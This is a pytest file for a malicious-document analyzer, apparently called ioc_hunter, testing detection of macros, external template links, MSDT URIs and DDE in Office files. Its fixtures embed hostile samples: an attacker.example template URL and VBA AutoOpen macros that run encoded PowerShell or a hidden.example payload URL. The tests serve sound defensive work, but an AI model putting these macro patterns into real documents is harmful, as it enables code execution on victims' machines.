"""End-to-end tests for the OOXML walker."""

from __future__ import annotations

from ioc_hunter.analyze import analyze, detect_format
from ioc_hunter.analyze.common import AnalyzerReport, FileFormat, Severity, Verdict
from ioc_hunter.analyze.ooxml import analyze_ooxml, is_ooxml
from tests._doc_fixtures import (
    build_compressed_atom,
    build_minimal_cfb,
    build_minimal_docm,
    build_minimal_xlsm_with_dde,
)


def _new_report() -> AnalyzerReport:
    return AnalyzerReport(
        path="<mem>",
        format=FileFormat.OOXML,
        file_size=0,
        truncated=False,
        md5="0" * 32,
        sha1="0" * 40,
        sha256="0" * 64,
    )


def _make_vba_project(vba_src: bytes) -> bytes:
    """Helper: a minimal vbaProject.bin with one module containing the
    given VBA source."""
    module_body = b"\x00" * 0x100 + build_compressed_atom(vba_src)
    return build_minimal_cfb({"VBA/dir": b"x" * 5000, "VBA/Module1": module_body})


class TestDispatcherDetection:
    def test_pk_magic_routes_to_ooxml(self):
        raw = build_minimal_docm()
        assert is_ooxml(raw)
        assert detect_format(raw[:16]) is FileFormat.OOXML


class TestSubtypeDetection:
    def test_docm_subtype_identified(self):
        raw = build_minimal_docm()
        r = analyze_ooxml(raw, report=_new_report())
        assert r.metadata["ooxml_subtype"] == "docm"

    def test_macro_enabled_finding(self):
        raw = build_minimal_docm()
        r = analyze_ooxml(raw, report=_new_report())
        assert any(f.rule == "ooxml.macro_enabled" for f in r.findings)


class TestExternalRelationships:
    def test_external_template_url_fires_high(self):
        raw = build_minimal_docm(external_rel_urls=["https://attacker.example/payload.dotm"])
        r = analyze_ooxml(raw, report=_new_report())
        ext = [f for f in r.findings if f.rule == "ooxml.external_relationship"]
        assert ext and ext[0].severity == Severity.HIGH
        # URL surfaced in metadata.
        assert "https://attacker.example/payload.dotm" in r.metadata["ooxml_external_rels"]


class TestMsdtScheme:
    def test_msdt_uri_detected_as_critical(self):
        raw = build_minimal_docm(msdt_uri=True)
        r = analyze_ooxml(raw, report=_new_report())
        crit = [f for f in r.findings if f.rule == "ooxml.msdt_scheme"]
        assert crit and crit[0].severity == Severity.CRITICAL


class TestDdeInXlsm:
    def test_dde_in_shared_strings_fires(self):
        raw = build_minimal_xlsm_with_dde()
        r = analyze_ooxml(raw, report=_new_report())
        assert any(f.rule == "ooxml.dde_field" for f in r.findings)


class TestVbaIntegration:
    def test_docm_with_autoopen_vba(self, tmp_path):
        vba = _make_vba_project(b'Sub AutoOpen()\n  Shell "powershell -enc QQBBAA=="\nEnd Sub\n')
        raw = build_minimal_docm(with_vba=vba)
        p = tmp_path / "evil.docm"
        p.write_bytes(raw)
        r = analyze(p)
        assert r.format is FileFormat.OOXML
        # Verdict driven by VBA findings: should be MALICIOUS.
        assert r.verdict is Verdict.MALICIOUS
        rules = {f.rule for f in r.findings}
        assert "vba.auto_exec" in rules
        assert "vba.encoded_powershell" in rules
        # ATT&CK techniques flow through.
        techniques = {t for f in r.findings for t in f.mitre}
        assert "T1204.002" in techniques
        assert "T1137.001" in techniques

    def test_decoded_vba_iocs_flow_to_dispatcher(self, tmp_path):
        vba = _make_vba_project(
            b"Sub AutoOpen()\n"
            b"  Dim url As String\n"
            b'  url = "http://hidden.example/payload"\n'
            b'  CreateObject("WScript.Shell").Run url\n'
            b"End Sub\n"
        )
        raw = build_minimal_docm(with_vba=vba)
        p = tmp_path / "evil2.docm"
        p.write_bytes(raw)
        r = analyze(p)
        ioc_values = {ioc.value for ioc in r.iocs}
        assert any("hidden.example" in v for v in ioc_values), (
            f"VBA-decoded IOCs missing — got {ioc_values}"
        )


class TestCleanDocx:
    def test_plain_docx_is_clean(self, tmp_path):
        raw = build_minimal_docm(macro_enabled=False)
        p = tmp_path / "plain.docx"
        p.write_bytes(raw)
        r = analyze(p)
        assert r.format is FileFormat.OOXML
        # macro_enabled finding NOT emitted.
        assert not any(f.rule == "ooxml.macro_enabled" for f in r.findings)
